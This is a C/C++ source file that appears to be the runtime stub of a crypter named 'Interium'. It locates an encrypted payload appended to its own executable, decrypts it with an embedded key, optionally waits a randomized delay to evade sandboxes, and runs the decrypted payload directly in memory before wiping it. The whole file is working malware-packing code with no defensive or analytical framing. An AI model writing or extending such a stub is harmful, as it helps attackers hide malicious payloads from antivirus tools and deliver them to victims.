#include <windows.h>
#include <winternl.h>
#include <string.h>
#include "stub.h"
#include "crypto.h"
#include "loader.h"

static StubConfig* findConfig() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize < sizeof(StubConfig)) {
        CloseHandle(hFile);
        return NULL;
    }

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return NULL; }

    u8* base = (u8*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMap); CloseHandle(hFile); return NULL; }

    StubConfig* result = NULL;
    for (DWORD i = fileSize - sizeof(StubConfig); i > 1024; i--) {
        StubConfig* cfg = (StubConfig*)(base + i);
        if (cfg->magic == STUB_MAGIC && cfg->keySize <= 64 && cfg->payloadSize > 0) {
            size_t totalSize = sizeof(StubConfig) + cfg->keySize + cfg->payloadSize;
            if (i + totalSize <= fileSize) {
                result = (StubConfig*)VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (result) {
                    memcpy(result, cfg, totalSize);
                }
                break;
            }
        }
    }

    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return result;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    StubConfig* config = findConfig();
    if (!config) return 1;

    if (config->flags & FLAG_DELAY_EXEC) {
        Sleep(3000 + (GetTickCount() % 2000));
    }

    u8* key = (u8*)(config + 1);
    u8* encPayload = key + config->keySize;

    auto decrypted = Interium::Crypto::decrypt(
        encPayload, config->payloadSize,
        key, config->keySize,
        (Interium::ObfuscationLevel)config->level
    );

    if (!decrypted.empty()) {
        Loader::e_InMem(decrypted.data(), decrypted.size());
        SecureZeroMemory(decrypted.data(), decrypted.size());
    }

    VirtualFree(config, 0, MEM_RELEASE);
    return 0;
}
